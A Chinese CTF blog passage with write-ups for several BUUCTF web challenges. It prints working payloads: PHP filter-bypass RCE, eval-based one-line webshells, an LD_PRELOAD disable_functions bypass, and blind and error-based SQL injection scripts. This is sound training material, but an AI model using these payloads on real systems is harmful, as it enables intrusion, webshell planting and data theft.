class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p><em><strong>通过存在file_get_contents()读取通过get提交参数2333的内容，通过伪协议data://数据流封装器，以传递相应格式的数据。</strong></em></p>
<p><em><strong>这里可以不进行base64加密操作，</strong></em></p>
<p><em><strong>payload：</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain,todat is a happy day</span><br></pre></td></tr></table></figure>

<p>还有这里xff给ban了，我们使用<strong>Client-IP</strong>进行IP伪造，Client的IP是通过http的头部发送到server端的。</p>
<p><em><strong>这里对file传入的参数加密了，</strong></em></p>
<p><strong><em>通过change函数的作用，传入的参数先进行base64解码，然后将字符转化成ASCII并且+$i</em>2</strong>*</p>
<p><em><strong>char()把ascii转成字符串，ord()把字符串变ascii码</strong></em></p>
<p><strong><em>我们通过加密脚本，反写一个解密脚本。先把字符串转成ascii码，再-$i</em>2，最后base64编码。</strong>*</p>
<p><em><strong>很简单，只是一个顺序问题，还有加减问题。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![8](buu3/8.png)&lt;?phpfunction unchange($v)&#123;     $re = &#x27;&#x27;;     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) - $i*2 );     &#125;     return base64_encode($re); &#125;echo unchange(&quot;flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p><em><strong>得到</strong></em></p>
<p><em><strong>ZmpdYSZmXGI=</strong></em></p>
<p><em><strong>不放心，可以放进change函数跑一下，最后拿到flag，这种只有一段源码需要分析的其实相对清晰一些。</strong></em></p>
<p><em><strong>完整payload：</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>

<p>这里多加%20进行连接，不然会跳400.</p>
<p><img src="buu3/8.png"></p>
<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><p>标题很直接，直接提示rce。无参数攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</span><br></pre></td></tr></table></figure>

<p>限制传入参数长度小于40，并且把字母数字全部过滤了，</p>
<p>先看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">php代码执行过滤的一些绕过方法</a></p>
<p>总结的很好，这里我们通过对PHP&gt;=7时，可以直接利用取反构造payload来绕过，先查看一下phpinfo信息。对于rce，我们都可以先通过phpinfo()检测是否有效。</p>
<p><img src="buu3/9.png"></p>
<p>这里需要在在线编辑器进行，得到%8F%97%8F%96%91%99%90</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><img src="buu3/9.png"></p>
<p>看到禁用函数有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">禁用的函数：pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>

<p>但是常用assert()函数没被禁，我们可以写入一句话木马，再用蚁剑连接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php //error_reporting(0);$a=&#x27;assert&#x27;;$b=urlencode(~$a);echo $b;echo &#x27;.................&#x27;;$c=&#x27;(eval($_POST[1]))&#x27;;$d=urlencode(~$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>

<p>生成：</p>
<p><img src="buu3/10.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p><img src="buu3/11.png"></p>
<p>检测shell是可用的，但是蚁剑连不上。第二天一做成功连接，但是flag文件里面内容为空，存在一个readflag。我们需要执行执行这个readflag，但是太多函数被禁用了，绕过这些禁用，我们可以通过使用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p>
<p>参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXP</a></p>
<p>由于在/var/tmp目录有上传权限，我们可以上传禁用函数绕过的文件，上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php）</p>
<p>这里劫持共享so的具体操作可以参考：<a target="_blank" rel="noopener" href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/">http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/</a></p>
<p><img src="buu3/13.png"></p>
<p>最后通过异或的方法执行readflag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>





<h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p>有个查询成绩框，尝试各种sql注入，感觉就只能盲注了。</p>
<p>这里附上的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;</span>:</span><br><span class="line">        url=<span class="string">&quot;http://101.200.53.102:10114/?stunum=if((select(substr(group_concat(value),&#123;&#125;,1))from/**/flag)=&#x27;&#123;&#125;&#x27;,1,2)&quot;</span>.<span class="built_in">format</span>(i,j) </span><br><span class="line">        c = s.get(url ,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment">#print c.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hi admin&#x27;</span> <span class="keyword">in</span> c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>













<h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><p><img src="buu3/12.png"></p>
<p>把cookie内容修改成username=admin即可。</p>
<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>传入json格式的命令，</p>
<p>我们传入cmd。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>得到一个index.php文件，尝试读取内容，存在过滤。</p>
<p>直接看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;      system(<span class="variable">$cmd</span>);    &#125; <span class="keyword">else</span> &#123;      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;    &#125;    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了很多函数，绕过preg_match()函数，第一种方法：因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过，</p>
<p>源码中可以看到putenv(‘PATH=/home/rceservice/jail’)已经修改了环境变量，我们只能用绝对路径来调用系统命令</p>
<p>cat命令在/bin中保存，所以构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure>

<p>这里的payload要使用hackbar，不然%0a会被再一次url编码而导致失效。</p>
<p>方法二：</p>
<p>使用脚本进行回溯次数绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">参考</a></p>
<h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h3><p>fuzz测试，得到源码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);?&gt;</span><br></pre></td></tr></table></figure>

<p>*<em>这里有个转义函数，为了防止单引号注入，如果传入\0就会变成\\0，同时有个正则替换，这样就变成了只剩一个\*</em></p>
<p><em><strong>这个反斜杠正好可以转义后面的查询语句中闭合id的单引号的反斜杠，</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#这里直接爆密码，还有类似爆前面的库名表名等等。import requestsurl=&#x27;http://f5dfd7dd-277f-4b79-bfbc-e1021dfd509f.node3.buuoj.cn/image.php?id=\\0&amp;path= or id=&#x27;flag=&#x27;&#x27;for i in range(1,21):	min=32;	max=125;	while 1:		j=min+(max+min)/2		if min==j:			flag+=chr(j)			print(flag)			break					payload=&quot;if (ascii(substr((select password from users),&#123;&#125;,1))&lt;&#123;&#125;,1,2)%23&quot;.format(i,j);				r=requests.get(url=url+payload).text				if len(r)==117007:            max=j        else :            min=j</span><br></pre></td></tr></table></figure>

<p>爆破得到密码，用户名为admin登陆，存在文件上传。</p>
<p><img src="buu3/55.png"></p>
<p>这里会将文件名和用户名写入日志文件，同时这里日志文件为php格式，所以通过文件名进行注入，因为文件名会被写入日志文件中，可以执行php代码。不能上传php文件。对文件名过过滤了，新学了php短标签，将php换成=</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="buu3/56.png"></p>
<p><strong>本题关键：反斜杠转义作用，盲注脚本注入，PHP短标签</strong></p>
<h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.phpif (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123;  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123;  $guess = (string) $_POST[&#x27;guess&#x27;];  if (hash_equals($secret, $guess)) &#123;    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;  &#125; else &#123;    $message = &#x27;Wrong.&#x27;;  &#125;&#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>





<p>这里通过输入正确答案没法绕过，我们需要从config.php读取flag，config.php被正则过滤了，这里有个<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_basename.asp">basename()函数</a>，先看看它的作用。</p>
<p><img src="buu3/14.png"></p>
<p><em><strong>$_SERVER[‘PHP_SELF’]返回的是当前正在执行的脚本的名字</strong></em></p>
<p><em><strong>当我们传入这样的路径，最后就是highlight_file(config.php)，但是被正则替换了，我们要想办法绕过。</strong></em></p>
<p><em><strong>可以通过一些特殊url编码符号绕过，如%0a,%0b,%0c,%0d,%20等等。</strong></em></p>
<p><em><strong>我们使用%20,返回的是index.php。</strong></em></p>
<p><img src="buu3/15.png"></p>
<p><em><strong>我们加上?source，对config.php，进行访问，换了很多个符合，都无法访问。</strong></em></p>
<p><img src="buu3/16.png"></p>
<p>这里肯定跟basename函数一些特性有关系,basename()函数存在一个问题，它会去掉文件名开头的非ASCII值</p>
<p>ASCII值范围为0-255，但ASCII码并没有规定编号为128~255的字符，ASCII表范围为0-127，也就是我们传入128以上的数值，即可绕过正则，<code>128 -&gt; 0x80</code></p>
<p>转化成url编码就是%80</p>
<p><img src="buu3/17.png"></p>
<p><strong>本题关键：对黑名单绕过结合basename函数漏洞</strong></p>
<h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p><em><strong>发现存在五个php文件，index,search,delete,charge,confirm。怎么感觉又是反序列化。</strong></em></p>
<p><em><strong>没拿到源码，我们先尝试尝试，search.php能否实现什么查询功能。</strong></em></p>
<p><em><strong>订单查询只需要输入姓名，电话即可查询地址，看看能不能执行我们传入的代码，只起到打印的作用。</strong></em></p>
<p><em><strong>还尝试一下有没有ssti注入。</strong></em></p>
<p><em><strong>看到源码中提示?file=</strong></em></p>
<p><em><strong>尝试直接读取index.php，不行。</strong></em></p>
<p><em><strong>通过php伪协议读取成功。</strong></em></p>
<p><em><strong>index.php</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123;    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;        echo(&#x27;no way!&#x27;);        exit;    &#125;    @include($file);&#125;?&gt;&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>

<p><strong>search.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;         $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        if(!$row) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#x27;user_name&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#x27;phone&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#x27;address&#x27;].&quot;&lt;/p&gt;&quot;;    &#125; else &#123;        $msg = &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>change.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];        $result = $db-&gt;query($sql);        if(!$result) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;订单修改成功&quot;;    &#125; else &#123;        $msg = &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>confirm.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if($fetch-&gt;num_rows&gt;0) &#123;        $msg = $user_name.&quot;已提交订单&quot;;    &#125;else&#123;        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);        $re = $re-&gt;execute();        if(!$re) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;订单提交成功&quot;;    &#125;&#125; else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>delete.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))&#123;    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;         <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);    &#125;    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;            print_r(<span class="variable">$db</span>-&gt;error);            <span class="keyword">exit</span>;        &#125;        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;    &#125; <span class="keyword">else</span> &#123;        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><em><strong>哈哈哈不是反序列化问题，应该是sql注入。但是过滤了很多函数，仔细看change.php就会发现update存在注入，过滤没有那么严格。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="buu3/18.png"></p>
<p><em><strong>构造payload读取flag.txt文件。</strong></em></p>
<p><em><strong>前面修改地址的时候，为了测试sql注入，后面需要改过来，不然会一直报错，因为在执行update前面的旧地址多了一个单引号导致一直报错。</strong></em></p>
<p><em><strong>payload：</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,60)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><em><strong>两次分别返回部分的flag。</strong></em></p>
<p><img src="buu3/19.png"></p>
<p><img src="buu3/20.png"></p>
<p><em><strong>这里记得第二次要删除订单再第二次报错注入。不然只会返回第一次查询的结果，也是因为会更新的原因，同上。</strong></em></p>
